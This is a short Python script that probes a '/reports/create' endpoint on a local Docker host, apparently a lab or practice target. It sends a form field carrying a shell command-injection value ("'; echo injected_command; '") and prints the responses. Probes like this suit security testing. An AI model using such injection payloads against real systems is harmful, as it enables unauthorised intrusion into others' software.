import requests

endpoints = ["/reports/create"]
methods = ["GET", "POST"]
payload = {'sensitive_fields': "'; echo injected_command; '"}

for endpoint in endpoints:
    for method in methods:
        url = f"http://host.docker.internal:1337{endpoint}"
        try:
            if method == "GET":
                response = requests.get(url, timeout=5)
            elif method == "POST":
                response = requests.post(url, data=payload, timeout=5)
            else:
                print(f"Invalid method: {method}")
                continue

            print(f"[{method}] {url} - Status: {response.status_code}")
            if response.status_code == 200:
                print(f"  Content: {response.text[:200]}...") # Print only the first 200 characters
        except requests.exceptions.RequestException as e:
            print(f"[{method}] {url} - Error: {e}")